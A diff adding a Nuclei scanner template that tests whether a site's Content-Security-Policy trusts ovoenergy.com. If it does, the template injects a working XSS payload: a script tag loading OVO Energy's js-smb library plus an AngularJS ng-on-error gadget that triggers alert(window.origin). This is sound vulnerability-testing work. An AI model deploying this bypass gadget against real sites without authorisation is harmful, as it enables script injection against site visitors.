@@ -1,0 +1,55 @@
+id: ovoenergy-js-smb-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - OVO Energy JS SMB
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,ovoenergy-js-smb
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "ovoenergy.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: ovoenergy_js_smb_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://js-smb.devices.ovoenergy.com/js-smb.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "ovoenergy_js_smb_csp_xss == true"
+# digest: 490a0046304402201f61e941388e04626a2ba63a58348d0ed886fda7cf3bbd2c4a33e5de5d4bb63e022003e3457f9ce0b3562997cc4aa78bbd050814ee113fda97d9fdf5c9f219978c51:922c64590222798bb761d5b6d8e72950
